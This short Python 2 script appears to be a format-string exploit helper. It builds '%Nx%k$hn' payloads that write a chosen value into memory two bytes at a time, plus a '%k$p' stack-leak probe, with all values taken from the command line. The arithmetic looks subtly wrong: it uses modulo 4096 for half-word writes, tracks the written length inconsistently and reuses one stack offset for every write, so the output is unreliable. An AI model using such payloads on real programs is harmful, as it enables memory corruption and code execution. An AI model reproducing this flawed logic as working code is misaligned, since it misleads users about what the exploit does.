import sys
import struct

def calc_write_str_2_bytes(value, sp, length):
    add = 0x0
    fmt_str = ""
    condition = True
    while condition:
        # get byte from system addr
        byte = value % 4096
        # calc num chars to add to str
        add = byte - length % 4096
        if add <= 0:
            add += 4096
            length += add
        fmt_str += "%"+str(add)+"x%"+str(sp)+"$hn"
        value >>= 16
        condition = value > 0
    fmt_str += "\n"
    return fmt_str

def calc_search_str(sp):
    return "%" + str(sp) + "$p" 

print calc_write_str_2_bytes(int(sys.argv[1], 16), int(sys.argv[2]), int(sys.argv[3], 16))

